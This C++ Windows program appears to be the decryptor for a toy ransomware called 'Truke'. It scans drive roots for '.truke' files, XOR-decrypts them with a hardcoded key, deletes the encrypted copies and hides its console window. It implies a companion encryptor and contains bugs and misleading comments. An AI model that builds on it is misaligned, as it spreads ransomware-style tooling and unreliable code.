
//Decrypt your Truke files
#include <iostream> //Input and Output
#include <dirent.h> //Displays filenames and folders
#include <fstream> //Use files
#include <Windows.h> 

using namespace std;

/* Function to receive Truke files 
and restore original files with decryption*/

 void enc( const char * name_file )
{
	string tool=name_file; // Data type changed from const char * to string
	string newname;  //Name the original file with its extension
    int num_index=tool.length();  //The length of the file name   
    
      //To scan files .truke
      if(tool[num_index-5]=='t'&&tool[num_index-4]=='r'&&tool[num_index-3]=='u')
      {
         for(int cha=0 ; cha<(num_index-6) ; cha++)
              newname+=tool[cha];
     
  
         ifstream inFile;   //odj Open a file
         ofstream outFile; //obj Close a file
	     string key = "Encryp_Decryp";  //Decryption key
	     //Open the file in binary
     	 inFile.open(name_file, ios::in | ios::binary);
         cout<<name_file;  //Print the file name
         // Reads a text file into a single string.
         string str((istreambuf_iterator<char>(inFile)), istreambuf_iterator<char>()); 
         inFile.close(); //Close a file
         cout << "The file has been read into memory as follows:" << endl;   
    

         //decryption
         //str.size()//This function is used to return the length of the string in terms of bytes.
         cout << "The file has been encrypted as follows:" << endl;
         for (unsigned x = 0; x < str.size(); x++)           // Steps through the characters of the string.
         //Cycles through a multi-character encryption key,and encrypts the character using an XOR bitwise encryption.
         str[x] ^= key[x % key.size()];            
        
		 // Write Encrypted File 
         outFile.open(newname.c_str(), ios::out | ios::binary);
         outFile.write(str.c_str(), str.size());         // Writes the string to the binary file by first converting it to a C-String using the .c_str member function.
         outFile.close();
         remove(name_file); //Delete a file .truke
    }
}
    
    void HideConsole()  //Function to hide the run screen after execution
    { ::ShowWindow(::GetConsoleWindow(), SW_HIDE);}
     
    //The main function
    int main(void)
    {
    string Conver; //Variable declaration conver
    string pass;//Variable declaration pass
    char * fileName;//Variable declaration fileName
    DIR *d; //**
    struct dirent *dir;//**
    const char * a[]= {"D:/","F:/","E:/","J:/","H:/","C:/","I:/","G:/"};//Reserve an array of disk names
    
         for(int hard=0 ; hard<=7; hard++)//Pass all discs to view the decrypted files
         {
            const  char * deskName=a[hard];
            d = opendir(deskName);//**
            if (d)
            {
                while ((dir = readdir(d)) != NULL)//**
                {
                  fileName= dir->d_name;//A function that returns the name and extension of files
                  int p=  dir->d_namlen;//A function that returns the number of characters of the name and extension
                   if(fileName[p-6]=='.' &&  fileName[p-5]=='t' && fileName[p-2]=='k')//Scan files if .truke
   	               {
			         if(deskName=="D:/" )  //Scan desk d &And send files to decryption
			         { Conver=fileName;   pass="D:/"+ Conver;  enc(pass.c_str() );  }
			 	 
				         else if(deskName=="C:/")  //Scan desk c & And send files to decryption
				         { Conver=fileName;   pass="C:/"+ Conver;  enc(pass.c_str());  }
		
			               else if(deskName=="F:/")  //Scan desk f & And send files to decryption
				           { Conver=fileName;   pass="F:/"+ Conver;  enc(pass.c_str()); }
				  
				            else if(deskName=="E:/")  //Scan desk e & And send files to decryption
				            { Conver=fileName;   pass="E:/"+ Conver;  enc(pass.c_str());  }
				   
				             else if(deskName=="J:/")  //Scan desk j & And send files to decryption
				             { Conver=fileName;   pass="J:/"+ Conver;  enc(pass.c_str());  }
				   
				               else if(deskName=="H:/")  //Scan desk h & And send files to decryption
				               { Conver=fileName;   pass="H:/"+ Conver;  enc(pass.c_str());  }
				   
				                else if(deskName=="G:/")  //Scan desk g & And send files to decryption
				                { Conver=fileName;   pass="G:/"+ Conver;  enc(pass.c_str());  }
				   
				                  else if(deskName=="I:/")  //Scan desk i & And send files to decryption
				                  { Conver=fileName;   pass="I:/"+ Conver;  enc(pass.c_str());  }	   
		        	}	
                }
 		    } 
			closedir(d);
	     }
HideConsole();//callind function
    return 0;
}

